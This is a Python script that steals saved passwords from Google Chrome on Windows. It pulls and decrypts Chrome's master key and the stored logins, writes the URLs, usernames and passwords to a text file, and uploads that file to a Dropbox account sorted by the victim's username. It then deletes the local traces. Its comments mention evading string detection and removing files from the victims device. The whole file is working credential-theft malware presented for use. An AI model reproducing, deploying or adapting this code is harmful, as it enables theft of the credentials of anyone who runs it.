import os
import json
import base64
import sqlite3
import win32crypt
from Crypto.Cipher import AES
import shutil
import dropbox
from codecs import encode
import getpass


def upload_passfile():
    # pass accesstoken in rot13 to avoid sring detection - people having control over the account
    access_token = encode("dropbox_access_link", 'rot13')
    
    # name of local pass file
    file_from = "rc.txt"
    # name of file when sent to dropbox, organised by username
    file_to = "/passwords/" + str(getpass.getuser()) + "'s_passwords.txt"
    
    # upload the files
    client = dropbox.Dropbox(access_token)
    client.files_upload(open(file_from, "rb").read(), file_to, dropbox.files.WriteMode.overwrite, mute=True)


def get_master_key():
    # this finds the key needed to decrypt the Local Data passwords
    with open(os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\Local State', "r", encoding='utf-8') as f:
        local_state = f.read()
        local_state = json.loads(local_state)
    # iterate through the file and find the key which is to the right of os_crypt
    master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
    master_key = master_key[5:]  # removing DPAPI
    master_key = win32crypt.CryptUnprotectData(master_key, None, None, None, 0)[1] # sqlite3 decryption
    return master_key # return the key in plain text


def decrypt_payload(cipher, payload):
    return cipher.decrypt(payload)


def generate_cipher(aes_key, iv):
    return AES.new(aes_key, AES.MODE_GCM, iv)


def decrypt_password(buff, master_key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = generate_cipher(master_key, iv)
        decrypted_pass = decrypt_payload(cipher, payload)
        decrypted_pass = decrypted_pass[:-16].decode()  # remove suffix bytes
        return decrypted_pass

    except Exception as e:
        # print("Probably saved password from Chrome version older than v80\n")
        # print(str(e))
        decrypted_pass = win32crypt.CryptUnprotectData(buff, None, None, None, 0) #Tuple
        return str(decrypted_pass[1])


if __name__ == '__main__':

    master_key = get_master_key()
    login_db = os.environ['USERPROFILE'] + os.sep + r'AppData\Local\Google\Chrome\User Data\default\Login Data'
    shutil.copy2(login_db, "Loginvault.db") #making a temp copy since Login Data DB is locked while Chrome is running
    conn = sqlite3.connect("Loginvault.db")
    cursor = conn.cursor()

    try:
        # grab the needed information
        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
        # make a local file with the login data
        passfile = open("rc.txt", "w")
        for r in cursor.fetchall():
            # these 2 are already in plain text
            url = r[0]
            username = r[1]
            encrypted_password = r[2]
            # now decrypt the password using the master key via AES encryption / decryption
            decrypted_password = decrypt_password(encrypted_password, master_key)
            #print("URL: " + url + "\nUsername: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
            # sort it and make it look more organised
            passfile.write("URL: " + url + "\nUsername: " + username + "\nPassword: " + decrypted_password + "\n" + "*" * 50 + "\n")
        # finish the files
        passfile.close()
        conn.close()

    except Exception as e:
        print(e)

    # upload the file to the dropbox
    upload_passfile()
    # finally delete the files off the victims device
    os.remove("rc.txt")
    os.remove("Loginvault.db")